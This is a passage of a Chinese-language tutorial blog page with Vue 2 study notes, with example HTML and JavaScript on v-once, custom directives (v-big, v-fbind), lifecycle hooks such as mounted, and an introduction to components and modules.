class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202050830125.png" alt="image-20220205083041510"></p><p>v-once在初次动态渲染后就变成了静态资源，以后的数据更新不会引起v-once结构的更新，可用于优化性能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;天气案例_监视属性_简写&lt;/title&gt;</span><br><span class="line">    &lt;!-- 引入Vue --&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 准备好一个容器--&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">        &lt;h2 v-once&gt;n的初始值为&#123;&#123;n&#125;&#125;&lt;/h2&gt;&lt;br&gt;</span><br><span class="line">        &lt;h2&gt;n为&#123;&#123;n&#125;&#125;&lt;/h2&gt;&lt;br&gt;</span><br><span class="line">        &lt;button @click=&quot;n++&quot;&gt;n++&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">    //使用computed属性实现   </span><br><span class="line">    const vm = new Vue(&#123;</span><br><span class="line">        el: &#x27;#root&#x27;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            n: 1</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h3><p>指令钩子函数会被传入以下参数：</p><ul><li><p><code>el</code>：指令所绑定的元素，可以用来直接操作 DOM。</p></li><li><p>```<br>binding</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ：一个对象，包含以下 property：</span><br><span class="line"></span><br><span class="line">  - `name`：指令名，不包括 `v-` 前缀。</span><br><span class="line">  - `value`：指令的绑定值，例如：`v-my-directive=&quot;1 + 1&quot;` 中，绑定值为 `2`。</span><br><span class="line">  - `oldValue`：指令绑定的前一个值，仅在 `update` 和 `componentUpdated` 钩子中可用。无论值是否改变都可用。</span><br><span class="line">  - `expression`：字符串形式的指令表达式。例如 `v-my-directive=&quot;1 + 1&quot;` 中，表达式为 `&quot;1 + 1&quot;`。</span><br><span class="line">  - `arg`：传给指令的参数，可选。例如 `v-my-directive:foo` 中，参数为 `&quot;foo&quot;`。</span><br><span class="line">  - `modifiers`：一个包含修饰符的对象。例如：`v-my-directive.foo.bar` 中，修饰符对象为 `&#123; foo: true, bar: true &#125;`。</span><br><span class="line"></span><br><span class="line">- `vnode`：Vue 编译生成的虚拟节点。移步 [VNode API](https://cn.vuejs.org/v2/api/#VNode-接口) 来了解更多详情。</span><br><span class="line"></span><br><span class="line">- `oldVnode`：上一个虚拟节点，仅在 `update` 和 `componentUpdated` 钩子中可用。</span><br><span class="line"></span><br><span class="line">  ```js</span><br><span class="line">  Vue.directive(&#x27;demo&#x27;, &#123;</span><br><span class="line">    bind: function (el, binding, vnode) &#123;</span><br><span class="line">      var s = JSON.stringify</span><br><span class="line">      el.innerHTML =</span><br><span class="line">        &#x27;name: &#x27;       + s(binding.name) + &#x27;&lt;br&gt;&#x27; +</span><br><span class="line">        &#x27;value: &#x27;      + s(binding.value) + &#x27;&lt;br&gt;&#x27; +</span><br><span class="line">        &#x27;expression: &#x27; + s(binding.expression) + &#x27;&lt;br&gt;&#x27; +</span><br><span class="line">        &#x27;argument: &#x27;   + s(binding.arg) + &#x27;&lt;br&gt;&#x27; +</span><br><span class="line">        &#x27;modifiers: &#x27;  + s(binding.modifiers) + &#x27;&lt;br&gt;&#x27; +</span><br><span class="line">        &#x27;vnode keys: &#x27; + Object.keys(vnode).join(&#x27;, &#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  </span><br><span class="line">  new Vue(&#123;</span><br><span class="line">    el: &#x27;#hook-arguments-example&#x27;,</span><br><span class="line">    data: &#123;</span><br><span class="line">      message: &#x27;hello!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>一个指令定义对象可以提供如下几个钩子函数 (均为可选)：</p><ul><li><code>bind</code>：只调用一次，<strong>指令第一次绑定到元素时调用</strong>。在这里可以进行一次性的初始化设置。</li><li><code>inserted</code>：<strong>被绑定元素插入父节点时调用</strong> (仅保证父节点存在，但不一定已被插入文档中)。</li><li><code>update</code>：所在组件的 VNode 更新时调用，<strong>但是可能发生在其子 VNode 更新之前</strong>。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</span></span></span><br><span class="line"><span class="comment"><span class="xml">需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</span></span></span><br><span class="line"><span class="comment"><span class="xml">自定义指令总结：</span></span></span><br><span class="line"><span class="comment"><span class="xml">一、定义语法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).局部指令：</span></span></span><br><span class="line"><span class="comment"><span class="xml">new Vue(&#123;new Vue(&#123;</span></span></span><br><span class="line"><span class="comment"><span class="xml">directives:&#123;指令名:配置对象&#125;   或   directives&#123;指令名:回调函数&#125;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&#125;) &#125;)</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).全局指令：</span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">二、配置对象中常用的3个回调：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).bind：指令与元素成功绑定时调用。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).inserted：指令所在元素被插入页面时调用。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(3).update：指令所在模板结构被重新解析时调用。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">三、备注：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.指令定义时不加v-，但使用时要加v-；</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义全局指令</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* Vue.directive(&#x27;fbind&#x27;,&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//指令与元素成功绑定时（一上来）</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">bind(element,binding)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">element.value = binding.value</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;,</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//指令所在元素被插入页面时</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">inserted(element,binding)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">element.focus()</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;,</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//指令所在的模板被重新解析时</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">update(element,binding)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">element.value = binding.value</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;) */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">n</span>:<span class="number">1</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">directives</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* &#x27;big-number&#x27;(element,binding)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">// console.log(&#x27;big&#x27;)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">element.innerText = binding.value * 10</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;, */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">big</span>(<span class="params">element,binding</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;big&#x27;</span>,<span class="built_in">this</span>) <span class="comment">//注意此处的this是window</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(&#x27;big&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">element.innerText = binding.value * <span class="number">10</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">fbind</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//指令与元素成功绑定时（一上来）</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">element.value = binding.value</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//指令所在元素被插入页面时</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">element.focus()</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//指令所在的模板被重新解析时</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">element.value = binding.value</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>引出生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">生命周期：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.又名：生命周期回调函数、生命周期函数、生命周期钩子。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。</span></span></span><br><span class="line"><span class="comment"><span class="xml">4.生命周期函数中的this指向是vm 或 组件实例对象。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"> <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">a</span>:<span class="literal">false</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">opacity</span>:<span class="number">1</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>,<span class="built_in">this</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.opacity -= <span class="number">0.01</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">if</span>(<span class="built_in">this</span>.opacity &lt;= <span class="number">0</span>) <span class="built_in">this</span>.opacity = <span class="number">1</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,<span class="number">16</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//通过外部的定时器实现（不推荐）</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* setInterval(() =&gt; &#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">vm.opacity -= 0.01</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">if(vm.opacity &lt;= 0) vm.opacity = 1</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;,16) */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202090848727.png" alt="image-20220209084827921"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202091122790.png" alt="image-20220209112219471"></p><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220214110649777.png" alt="image-20220214110649777"></p><p>存在的问题：</p><ol><li>依赖关系混乱，代码不好维护</li><li>代码复用率不高</li></ol><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202141114374.png" alt="image-20220214111426123"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202141114309.png" alt="image-20220214111455262"></p><p>组件：<strong>实现应用中局部功能代码和资源的集合</strong></p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><ul><li>模块：向外提供特定功能的js代码，一般就是一个js文件</li><li>为什么使用模块：因为js文件很多很复杂</li><li>模块作用：简化js编写，提高js运行效率</li></ul><h3 id="组件-1"><a href="#组件-1" class="headerlink" title="组件"></a>组件</h3><ul><li>组件：用来实现局部(特定)功能的代码的集合(html、js、css)</li><li>为什么使用组件：一个界面的功能很复杂</li><li>作用：复用代码，简化项目代码</li></ul><h3 id="组件分类"><a href="#组件分类" class="headerlink" 